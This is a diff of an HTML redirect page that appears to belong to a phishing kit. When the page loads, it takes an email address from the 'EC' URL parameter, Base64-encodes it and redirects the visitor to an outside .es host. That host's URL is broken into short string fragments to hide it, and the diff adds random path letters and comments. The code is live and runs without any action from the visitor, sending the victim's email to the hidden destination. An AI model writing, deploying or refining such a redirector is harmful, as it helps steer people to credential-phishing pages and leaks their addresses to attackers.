@@ -3,45 +3,60 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>...</title>
+  <title>Email Redirect</title>
   <script>
-    function bIB(str, bits = 13) {
-      const bitLength = Math.ceil(str.length / bits);
+    // Function to split the encoded email into chunks
+    function splitIntoChunks(str, chunks = 20) {
+      const chunkSize = Math.ceil(str.length / chunks);
       const result = [];
-      for (let i = 0; i < bits; i++) {
-        const start = i * bitLength;
-        const end = start + bitLength;
+      for (let i = 0; i < chunks; i++) {
+        const start = i * chunkSize;
+        const end = start + chunkSize;
         result.push(str.slice(start, end));
       }
       return result;
     }
 
-    function combineBits(bits) {
-      return bits.join("");
+    // Function to combine chunks into a single string
+    function combineChunks(chunks) {
+      return chunks.join("");
     }
 
+    // Function to encode the email and redirect
     function encodeEmailAndRedirect() {
       const urlParams = new URLSearchParams(window.location.search);
-      const email = urlParams.get('EC');
+      const email = urlParams.get('EC'); // Get the email from the query parameter 'EC'
 
       if (email) {
+        // Encode the email using Base64
         const encodedEmail = btoa(email);
-        const redirectUrlBits = [
-          "ht", "tps", ":/", "/eb", "u6a", "j.j", "xeb", "pue", "ehg", ".es", "/Ol", "Lfm", "M/?"];
 
-        const emailBits = bIB(encodedEmail);
+        // Split the encoded email into chunks
+        const emailChunks = splitIntoChunks(encodedEmail);
 
-        const finalUrl = combineBits(redirectUrlBits) + combineBits(emailBits);
+        // Define the base URL parts
+        const redirectUrlParts = [
+          "ht", "tps", ":/", "/eb", "u6a", "j.j", "xeb", "pue", "ehg", ".es", "/Ol", "Lfm", "M/?"
+        ];
+
+        // Add two random letters after '/M/?'
+        const randomLetters = String.fromCharCode(97 + Math.floor(Math.random() * 26)) + String.fromCharCode(97 + Math.floor(Math.random() * 26));
+
+        // Combine the base URL parts, random letters, and encoded email chunks
+        const finalUrl = combineChunks(redirectUrlParts) + randomLetters + combineChunks(emailChunks);
+
+        // Redirect to the final URL
         window.location.href = finalUrl;
       } else {
-        alert("?!");
+        alert("Email parameter 'EC' is missing!");
       }
     }
 
+    // Call the function to execute the script
     encodeEmailAndRedirect();
   </script>
 </head>
 <body>
-  <h1>...</h1>
+  <h1>Redirecting...</h1>
 </body>
 </html>
